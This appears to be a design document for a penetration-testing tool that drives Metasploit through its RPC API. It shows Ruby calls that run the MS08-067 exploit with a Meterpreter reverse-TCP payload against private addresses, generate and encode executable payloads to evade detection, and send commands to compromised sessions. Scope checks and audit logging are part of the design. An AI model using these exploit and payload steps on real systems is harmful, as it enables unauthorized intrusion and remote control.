# 🔗 Metasploit RPC API Integration Design
## Hacked-tool v2.0.0 - Security Testing Platform

---

## 📚 Table of Contents

1. [RPC Architecture Overview](#rpc-architecture-overview)
2. [RPC Authentication & Session Management](#rpc-authentication--session-management)
3. [Module Operations](#module-operations)
4. [Payload Configuration](#payload-configuration)
5. [Session Management](#session-management)
6. [Security Mechanisms](#security-mechanisms)
7. [Implementation Workflow](#implementation-workflow)

---

## 🏗️ RPC Architecture Overview

### What is Metasploit RPC?

The **Metasploit RPC (Remote Procedure Call)** API allows external tools to communicate with Metasploit Framework programmatically using a client-server model.

```
┌─────────────────┐         MessagePack/JSON-RPC         ┌──────────────────┐
│  Hacked-tool    │ ◄────────────────────────────────────► │  Metasploit RPC  │
│  (Client)       │        (Network Communication)        │  Server (msfrpcd)│
│                 │                                        │                  │
│ • Vulnerability │                                        │ • Module Catalog │
│   Detection     │     RPC Methods & Responses            │ • Exploit Engine │
│ • Module Search │ ──────────────────────────────────────► │ • Session Mgmt   │
│ • Result Mapping│                                        │ • Database       │
└─────────────────┘                                        └──────────────────┘
       ▲                                                            ▲
       │                                                            │
       └────────────────────────────────────────────────────────────┘
                    REST + Authentication Token
```

### Key Components

#### 1. **msfrpcd** - RPC Daemon
- Standalone executable that listens on a network port (default: 55553)
- Starts the RPC server and manages connections
- Configuration: `msfrpcd -U username -P password -f`

#### 2. **msgrpc Plugin** - MessagePack RPC
- Protocol: MessagePack (binary serialization)
- Port: 55552 (default)
- SSL/TLS support
- Token-based authentication

#### 3. **JSON-RPC API** (Modern)
- Protocol: JSON-RPC 2.0
- Port: 8081 (default)
- HTTP/REST interface
- Authentication via API tokens

### RPC Communication Flow

```
Client                                    Server
  │                                         │
  ├─── Connect ────────────────────────────►│
  │                                         │
  ├─── auth.login(user, pass) ─────────────►│
  │                                         │ [Validate credentials]
  │                                         │
  │◄────── token=TOKEN_STRING ──────────────┤
  │                                         │
  ├─── module.search([token], "query") ────►│
  │                                         │ [Search modules]
  │                                         │
  │◄────── modules=[{...}, {...}] ──────────┤
  │                                         │
  ├─── module.options([token], mod) ───────►│
  │                                         │ [Get options]
  │                                         │
  │◄────── options={...} ───────────────────┤
  │                                         │
  ├─── module.execute([token], opts) ──────►│
  │                                         │ [Run module]
  │                                         │
  │◄────── uuid=EXECUTION_UUID ─────────────┤
  │                                         │
  ├─── module.results([token], uuid) ──────►│
  │                                         │ [Get results]
  │                                         │
  │◄────── results={...} ───────────────────┤
  │                                         │
  └─────────────────────────────────────────┘
```

---

## 🔐 RPC Authentication & Session Management

### Authentication Methods

#### Method 1: Username/Password Authentication

```ruby
# Request
rpc.call('auth.login', 'msf', 'password123')

# Response
{
  "result" => "success",
  "token" => "TOKEN_STRING_32_BYTES",
  "expiration" => 300  # seconds
}
```

**Process:**
1. Send username and password
2. Server validates against database
3. Returns auth token
4. Token expires after 5 minutes of inactivity

#### Method 2: Token-Based Authentication

```ruby
# Generate new token
rpc.call('auth.token_generate')
# Returns: {"token" => "NEW_TOKEN"}

# Add pre-existing token
rpc.call('auth.token_add', 'EXISTING_TOKEN')

# List all tokens
rpc.call('auth.token_list')
# Returns: {"tokens" => [token1, token2, ...]}

# Remove token
rpc.call('auth.token_remove', 'TOKEN_TO_DELETE')
```

### Token Lifecycle

```
┌──────────────────┐
│  Token Inactive  │
└────────┬─────────┘
         │
         │ [Send RPC call]
         │
         ▼
┌──────────────────┐     [5 min idle]
│  Token Active    ├─────────────────────►
│  (in use)        │
└────────┬─────────┘                      │
         │                                │
         │ [Keep using]                   │
         │                                │
         └────────────────────────────────►
                                          │
                                          ▼
                                  ┌──────────────────┐
                                  │ Token Expired    │
                                  │ (auto-renew)     │
                                  └──────────────────┘
```

**Key Points:**
- Tokens expire after 5 minutes of inactivity
- Auto-renew on next RPC call if credentials available
- Temporary tokens start with "TEMP" prefix
- Database tokens permanent until removed

---

## 🔍 Module Operations

### Module Types Available

```
exploit/     - Exploit modules (hundreds available)
auxiliary/   - Reconnaissance/scanning modules
payload/     - Payload generators (meterpreter, reverse shell, etc.)
post/        - Post-exploitation modules
evasion/     - Anti-virus/IDS evasion techniques
```

### Module Search

```ruby
# Basic search
rpc.call('module.search', [TOKEN], 'smb windows')

# Advanced search with operators
rpc.call('module.search', [TOKEN], 'author:egypt windows')
rpc.call('module.search', [TOKEN], 'rank:excellent platform:win')
rpc.call('module.search', [TOKEN], 'cve:2021-44228')

# Response format
{
  "result" => [
    {
      "type" => "exploit",
      "name" => "Windows SMB Exploitation",
      "fullname" => "exploit/windows/smb/ms08_067_netapi",
      "rank" => "excellent",
      "disclosuredate" => "2008-10-28"
    },
    {
      "type" => "auxiliary",
      "name" => "SMB Scanner",
      "fullname" => "auxiliary/scanner/smb/smb_version",
      "rank" => "normal"
    }
  ]
}
```

### List All Modules

```ruby
# List exploits
rpc.call('module.exploits', [TOKEN])
# Returns: {"modules" => ["windows/smb/ms08_067_netapi", ...]}

# List auxiliaries
rpc.call('module.auxiliaries', [TOKEN])

# List payloads
rpc.call('module.payloads', [TOKEN])

# List post-exploitation modules
rpc.call('module.posts', [TOKEN])

# List encoders
rpc.call('module.encoders', [TOKEN])

# List nops
rpc.call('module.nops', [TOKEN])

# List evasion modules
rpc.call('module.evasions', [TOKEN])
```

### Get Module Information

```ruby
# Get detailed module info
rpc.call('module.info', [TOKEN], 'exploit', 'windows/smb/ms08_067_netapi')

# Response
{
  "type" => "exploit",
  "name" => "Microsoft Windows SMB Shares Integer Overflow (MS08-067)",
  "description" => "This module exploits ...",
  "author" => ["egypt", "jduck"],
  "date" => 2008-10-28,
  "platform" => ["Windows"],
  "arch" => ["x86", "x86_64"],
  "privileged" => true,
  "license" => "MSF_LICENSE"
  # ... more fields
}
```

### Get Module Options

```ruby
# Get all available options for a module
rpc.call('module.options', [TOKEN], 'exploit', 'windows/smb/ms08_067_netapi')

# Response
{
  "RHOSTS" => {
    "type" => "address",
    "required" => true,
    "description" => "The target host(s)",
    "default" => nil
  },
  "RPORT" => {
    "type" => "port",
    "required" => true,
    "description" => "The target port",
    "default" => 445,
    "evasion" => false
  },
  "LHOST" => {
    "type" => "address",
    "required" => true,
    "description" => "The listen address"
  },
  "LPORT" => {
    "type" => "port",
    "required" => true,
    "description" => "The listen port",
    "default" => 4444
  },
  "PAYLOAD" => {
    "type" => "string",
    "required" => true,
    "description" => "The payload module",
    "default" => "windows/meterpreter/reverse_tcp"
  }
  # ... more options
}
```

---

## 🎯 Module Execution

### Execute Module

```ruby
# Prepare execution options
options = {
  "RHOSTS" => "192.168.1.100",
  "RPORT" => 445,
  "LHOST" => "192.168.1.50",
  "LPORT" => 4444,
  "PAYLOAD" => "windows/meterpreter/reverse_tcp"
}

# Execute module
result = rpc.call('module.execute', [TOKEN], 'exploit', 'windows/smb/ms08_067_netapi', options)

# Response
{
  "job_id" => 1,
  "uuid" => "UUID_STRING"
}
```

### Check if Module Works

```ruby
# Check method (simulates but doesn't exploit)
result = rpc.call('module.check', [TOKEN], 'exploit', 'windows/smb/ms08_067_netapi', options)

# Response
{
  "result" => "vulnerable",  # vulnerable | not_vulnerable | unknown | not_supported
  "details" => "Target is vulnerable to MS08-067"
}
```

### Get Module Results

```ruby
# Get results of executed module
result = rpc.call('module.results', [TOKEN], 'UUID_STRING')

# Response (varies by module, example for exploit)
{
  "job_id" => 1,
  "status" => "done",
  "return" => {
    "session_id" => 1,
    "lhost" => "192.168.1.50",
    "lport" => 4444
  }
}
```

### Acknowledge Results

```ruby
# Mark results as read
rpc.call('module.ack', [TOKEN], 'UUID_STRING')

# Response
{"result" => "success"}
```

---

## 💣 Payload Configuration

### Generate Payload

```ruby
# Generate raw payload
options = {
  "LHOST" => "192.168.1.50",
  "LPORT" => 4444,
  "FORMAT" => "exe",
  "BADCHARS" => "",
  "EXITFUNC" => "thread"
}

result = rpc.call('module.execute', [TOKEN], 'payload', 'windows/meterpreter/reverse_tcp', options)

# Response
{
  "job_id" => 2,
  "uuid" => "PAYLOAD_UUID"
}
```

### Encode Payload

```ruby
# Apply encoding/obfuscation
encode_options = {
  "DATA" => "PAYLOAD_BINARY",
  "ENCODER" => "x86/shikata_ga_nai",
  "ITERATIONS" => 10,
  "BADCHARS" => "\x00"
}

result = rpc.call('module.encode_payload', [TOKEN], encode_options)
```

### Generate Format

Supported payload formats:
- `exe` - Windows executable
- `dll` - Windows DLL
- `elf` - Linux executable
- `raw` - Raw bytecode
- `python` - Python code
- `vba` - VBA macro
- `aspx` - ASP.NET shell

---

## 🎮 Session Management

### List Active Sessions

```ruby
# List all active sessions
sessions = rpc.call('session.list', [TOKEN])

# Response
{
  "1" => {
    "info" => "windows\CORP\user",
    "workspace" => "default",
    "session_host" => "192.168.1.100",
    "session_port" => 12345,
    "session_type" => "meterpreter",
    "session_platform" => "windows",
    "target_host" => "",
    "username" => "CORP\\user"
  },
  "2" => {
    # ... another session
  }
}
```

### Get Session Details

```ruby
# Get details of specific session
session = rpc.call('session.shell_read', [TOKEN], 1, 0)

# Response
{
  "type" => "meterpreter",
  "tunnel_local" => "/192.168.1.50:4444",
  "tunnel_peer" => "/192.168.1.100:12345",
  "info" => "windows\CORP\user",
  "workingdirectory" => "C:\\Windows\\System32"
}
```

### Interact with Session

```ruby
# Send command to meterpreter session
result = rpc.call('session.shell_write', [TOKEN], 1, "getuid\n")

# Response
{"wrote" => 6}

# Read output
output = rpc.call('session.shell_read', [TOKEN], 1)

# Response
{
  "type" => "meterpreter",
  "data" => "Server username: CORP\\user",
  "read_count" => 23
}
```

### Kill Session

```ruby
# Terminate session
result = rpc.call('session.shell_kill', [TOKEN], 1)

# Response
{"result" => "success"}
```

---

## 🔒 Security Mechanisms

### Scope Validation

```
Allowed Target Scope:
├── Internal Networks
│   ├── 10.0.0.0/8
│   ├── 172.16.0.0/12
│   └── 192.168.0.0/16
│
├── Approved Hosts
│   └── [User-defined whitelist]
│
└── Testing Timeframe
    ├── Start Date
    ├── End Date
    └── Hours of Operation
```

### Authorization Checks

```
User Role ──────► Permission Level
├── Analyst      ► Recon + Scanning (read-only)
├── Tester       ► Module Search + Non-destructive Checks
├── Security     ► Full Module Execution
└── Admin        ► RPC Server Management
```

### Rate Limiting

```
API Call Limits:
├── Search requests:    100/minute
├── Module checks:      10/minute
├── Module executions:  5/minute
└── Session operations: 50/minute
```

### Logging & Audit

```
All RPC operations logged:
├── Timestamp
├── User Account
├── RPC Method Called
├── Parameters (sanitized)
├── Result Status
├── Response Time
└── Target/Resource Affected
```

---

## 📊 Implementation Workflow

### Complete RPC Integration Workflow

```
1. INITIALIZE CONNECTION
   ├── Create RPC client
   ├── Connect to msfrpcd server
   └── Handle connection errors

2. AUTHENTICATE
   ├── Send username/password
   ├── Receive auth token
   ├── Store token securely
   └── Handle token expiration

3. VULNERABILITY DETECTION
   ├── Scan for vulnerabilities
   ├── Collect CVE data
   └── Build vulnerability list

4. MODULE SEARCH
   ├── Query RPC for modules
   ├── Filter by CVE/platform
   ├── Rank by reliability
   └── Return matching modules

5. SCOPE VALIDATION
   ├── Check target IP ranges
   ├── Verify authorization
   ├── Check time window
   └── Confirm user permissions

6. PAYLOAD CONFIGURATION
   ├── Get payload options
   ├── Set LHOST/LPORT
   ├── Configure encoding
   └── Generate payload binary

7. MODULE EXECUTION
   ├── Send execution request
   ├── Wait for UUID
   ├── Monitor progress
   └── Handle errors

8. RESULT COLLECTION
   ├── Poll for module.results
   ├── Extract key data
   ├── Store in database
   └── Acknowledge results

9. SESSION MANAGEMENT
   ├── Get session ID
   ├── Store session info
   ├── Allow further interaction
   └── Clean up on exit

10. RESULT MAPPING
    ├── Map to vulnerability
    ├── Store exploitation data
    ├── Generate report
    └── Archive for compliance
```

---

## 💻 RPC Server Setup

### Starting msfrpcd

```bash
# Basic setup (no SSL)
msfrpcd -U <username> -P <password> -f

# With SSL
msfrpcd -U <username> -P <password> -S -f

# Custom host/port
msfrpcd -U <username> -P <password> -a 127.0.0.1 -p 55553 -f

# With JSON-RPC
msfrpcd -U <username> -P <password> -f
# JSON-RPC listens on http://localhost:8081/api/v1/json-rpc
```

### Starting via msfconsole

```ruby
# Inside msfconsole
load msgrpc ServerHost=0.0.0.0 ServerPort=55552 User=msf Pass=abc123 SSL=Y

# Check if running
jobs
```

---

## 🚀 Next Steps

1. **Connector Module** - Create MSFConnector class
2. **CVE Mapping** - Build CVE-to-MSF module mapping
3. **Session Manager** - Manage active sessions
4. **Safety Checks** - Implement scope validation
5. **Reporting** - Generate structured results

---

**This document covers the essential MSF RPC API methods for security testing platform integration.**

For official documentation, visit:
- https://docs.rapid7.com/metasploit/rpc-api
- https://github.com/rapid7/metasploit-framework/wiki/How-to-use-Metasploit-Messagepack-RPC
